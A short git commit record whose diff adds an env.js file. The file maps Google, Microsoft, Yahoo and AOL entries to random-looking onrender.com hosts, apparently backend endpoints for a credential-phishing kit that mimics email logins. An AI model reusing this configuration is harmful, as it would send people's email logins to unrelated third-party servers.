fddebf7726e266e17f97e45845eb4a222fa45387
Tyger012 <coastalloan60@gmail.com>
2025-10-17 08:35:02 -0400

    env.js

--- env.js
+++ env.js
@@ -1,1 +1,7 @@
-
+// Configuration loaded from environment variables
+window.CONFIG = {
+  GOOGLE_URL: 'https://fivecc58ea2-9d38-42e1-8ce1-8f3a953cd.onrender.com',
+  MICROSOFT_URL: 'https://fivecc58ea2-9d38-42e1-8ce1-8f3a953cd2.onrender.com/',
+  YAHOO_URL: 'https://angen-ussrc.onrender.com/',
+  AOL_URL: 'https://eightf3a953cd22c-00-1vjy83vzc27qi-aol.onrender.com/'
+};
